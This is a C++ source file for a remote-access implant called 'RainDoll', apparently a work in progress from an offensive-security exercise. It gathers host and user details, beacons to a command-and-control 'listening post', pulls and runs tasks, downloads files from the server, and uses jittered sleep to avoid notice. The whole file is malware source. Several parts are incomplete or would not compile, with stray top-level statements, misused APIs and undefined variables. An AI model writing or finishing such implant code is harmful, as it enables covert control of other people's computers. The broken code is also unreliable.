#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"
#include "tasks.h"

#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>
#include<map>
#include <unistd.h>
#include <tchar.h>
#include <stdio.h>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include <cpr/cpr.h>

#include <nlohmann/json.hpp>

using json = nlohmann::json;

//create id fro implant
UUID implantID;
UuidCreate( &implantID );

//https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
//https://pureinfotech.com/list-environment-variables-windows-10/
TCHAR* envVarStrings[] =
{
  TEXT("OS           = %OS%"),
  TEXT("PATH         = %PATH%"),
  TEXT("TEMP         = %TEMP%"),
  TEXT("COMPUTERNAME = %COMPUTERNAME%"),
  TEXT("USERNAME     = %USERNAME")
};
#define  ENV_VAR_STRING_COUNT  (sizeof(envVarStrings)/sizeof(TCHAR*))
#define SIZE 32767
void printError(TCHAR* msg);

TCHAR infoBuff[SIZE];

//situational awareness
void Implant::sitAware(){
    //make a dictionary in c++
    //https://www.codespeedy.com/dictionary-in-cpp/
    map<string, string> initVals;

    initVals["implantID"] = implantID;
    
    //might be calling these functions wrong!!
    //https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information

    initVals["hostname"] = gethostname(); //--> need to call hostname
    initVals["username"] = getlogin(); //--> need to call whoami 
    //https://stackoverflow.com/questions/8953424/how-to-get-the-username-in-c-c-in-linux
    initVals["token"] = GetCurrentProcessToken();

    //idk how to get this or what this is
    initVals["networkInterfaces"]; 

    //https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversion
    initVals["os_version"] = GetVersion();
    initVals["os_name"] = GetComputerName();
    
    //dont know if to create a new one or if it already exists
    initVals["compGUID"];


    // connectionIP
    // sessionKey
    // initVals["sleepTime"] = dwellDistributionSeconds;
    // jitter
    // firstCheckIn
    // lastCheckIn
    // os_type
    // os_version
}

// C2 = 
// REGISTER = 
// TASK =

//register the implant 


// Function to send an asynchronous HTTP POST request with a payload to the listening post
[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port,
    std::string_view uri,
    std::string_view payload) {
    // step 1. Set all our request constants 
    //(address of the server, port, http protocol version, request body holding json payload)
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    // Construct our listening post endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    // Make an asynchronous HTTP POST request to the server
    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() }, //--> what holds the results of any tasks run previously
        cpr::Header{ {"Content-Type", "application/json"} }
    );
    // Retrieve the response when it's ready
    cpr::Response response = asyncRequest.get();

    // Show the request contents
    std::cout << "Request body: " << requestBody << std::endl;

    // Return the body of the response from the listening post, may include new tasks
    return response.text;
};

//Function in progress to download a file from C2 and add it to disk
{
    string c2url = "http://localhost:5000"; //Have to make this the URL of th server 
    string implsntReg = "/implant/register"; //Make this Correct Path 
    string implantTask = "/implant/task"; //Make this Correct Path
    URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);

    return 0;
}

//URLDOWNLOADTOFILE EXAMPLE CODE

//string dwnld_URL = "127.0.0.1/screenchote.png";
//string savepath = "D:\\screenchote.png";
//URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
//set the situational awareness for the implant

// Implant ID: create an ID for the implant to distinguish it from others
// Computer Name: what computer did it connect from?
// Username: what user are you running as?
// GUID: what is the computer’s GUID?
// Integrity: what privileges do you have?
// Connecting IP address: what address did it connect from?
// Session Key: after you negotiated a session key, store it per agent
// Sleep: how often does the agent check in?
// Jitter: how random of a check in is it?
// First Seen: when did the agent first check in?
// Last Seen: when was the last time you saw the agent?
// Expected Check in: When should you expect to see the agent again?

// Method to send task results and receive new tasks
[[nodiscard]] std::string Implant::sendResults() {
    // Local results variable
    boost::property_tree::ptree resultsLocal;
    // A scoped lock to perform a swap from global results vairbale nto the local results variable 
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    // Format result contents into JSON 
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    // Contact listening post with results and return any tasks received
    return sendHttpRequest(host, port, uri, resultsStringStream.str());
}

// Method to parse tasks received from listening post
void Implant::parseTasks(const std::string& response) {
    // Local response variable to store response
    std::stringstream responseStringStream{ response };

    // Read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    // Range based for-loop to parse tasks and push them into the tasks vector
    // Once this is done, the tasks are ready to be serviced by the implant
    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        // A scoped lock to push tasks into vector, push the task tree and setter for the configuration task
        {
            //basically pushing all the tasks from the JSON file into the tasks vector
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) { 
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning); }) //set implant configuration
            );
        }
    }
}

// Loop and go through the tasks received from the listening post, then service them
void Implant::serviceTasks() {
    while (isRunning) {
        // Local tasks variable to store tasks
        std::vector<Task> localTasks;
        // Scoped lock to perform a swap
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex }; //do swap from task vector created above 
            tasks.swap(localTasks);
        }
        // Range based for-loop to call the run() method on each task and add the results of tasks
        for (const auto& task : localTasks) {
            // Call run() on each task and we'll get back values for id, contents and success
            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
            // Scoped lock to add task results
            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        // Go to sleep
        std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    }
}

// Method to start beaconing to the listening post
void Implant::beacon() {
    while (isRunning) {
        // Try to contact the listening post and send results/get back tasks
        // Then, if tasks were received, parse and store them for execution
        // Tasks stored will be serviced by the task thread asynchronously
        try {
            std::cout << "RainDoll is sending results to listening post...\n" << std::endl;
            const auto serverResponse = sendResults();
            std::cout << "\nListening post response content: " << serverResponse << std::endl;
            std::cout << "\nParsing tasks received..." << std::endl;
            parseTasks(serverResponse);
            std::cout << "\n================================================\n" << std::endl;
        }
        catch (const std::exception& e) {
            printf("\nBeaconing error: %s\n", e.what());
        }
        // Sleep for a set duration with jitter and beacon again later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };

        std::this_thread::sleep_for(sleepTimeChrono); //to appear less suspicious
    }
}

// Initialize variables for our object
Implant::Implant(std::string host, std::string port, std::string uri) :
    // Listening post endpoint URL arguments
    host{ std::move(host) },
    port{ std::move(port) },
    uri{ std::move(uri) },
    // Options for configuration settings
    isRunning{ true },
    dwellDistributionSeconds{ 1. },

    // Thread that runs all our tasks, performs asynchronous I/O
    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
}